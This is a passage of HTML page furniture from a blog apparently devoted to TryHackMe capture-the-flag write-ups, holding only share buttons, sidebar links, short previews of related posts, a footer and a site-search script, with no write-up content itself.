aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Cyborg%20-%20TryHackMe%20-%20Red%20Team%20README&url=https%3A%2F%2Fwww.redteamreadme.com%2Fposts%2Fcyborg%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recent Update</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/blog/">Blog - TryHackMe</a><li class="text-truncate lh-lg"> <a href="/posts/cyborg/">Cyborg - TryHackMe</a><li class="text-truncate lh-lg"> <a href="/posts/picklerick/">Pickle Rick - TryHackMe</a><li class="text-truncate lh-lg"> <a href="/posts/minotaur/">Minotaur's Labyrinth - TryHackMe</a><li class="text-truncate lh-lg"> <a href="/posts/mrrobot/">Mr Robot CTF - TryHackMe</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/easy/">easy</a> <a class="post-tag btn btn-outline-primary" href="/tags/medium/">medium</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/anthem/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1744076498" data-df="ll" > Apr 7, 2025 </time><h4 class="pt-0 my-2">Anthem - TryHackMe</h4><div class="text-muted"><p>I completed another easy room today on TryHackMe trying to work myself into a new habit of doing write-ups regularly. Anthem is a great box for beginners because the only tool you need is nmap. All...</p></div></div></a></article><article class="col"> <a href="/posts/picklerick/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1640976240" data-df="ll" > Dec 31, 2021 </time><h4 class="pt-0 my-2">Pickle Rick - TryHackMe</h4><div class="text-muted"><p>Pickle Rick was a fun Rick and Morty themed CTF box from TryHackMe. As you make your way through the system, you collect text files containing ingredients to turn Rick back into a human. There are ...</p></div></div></a></article><article class="col"> <a href="/posts/blog/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1744596000" data-df="ll" > Apr 13, 2025 </time><h4 class="pt-0 my-2">Blog - TryHackMe</h4><div class="text-muted"><p>This medium-difficulty TryHackMe box creates a pretty realistic penetration testing scenario with a metasploitable web service, a SUID escalation, and a few rabbit holes to distract you. My favorit...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"><div class="btn btn-outline-primary disabled" aria-label="Older"><p>-</p></div><a href="/posts/picklerick/" class="btn btn-outline-primary" aria-label="Newer" ><p>Pickle Rick - TryHackMe</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>¬© <time>2025</time> <a href="https://twitter.com/dnstun0">dnstun0</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>üê±</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/easy/">easy</a> <a class="post-tag btn btn-outline-primary" href="/tags/medium/">medium</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
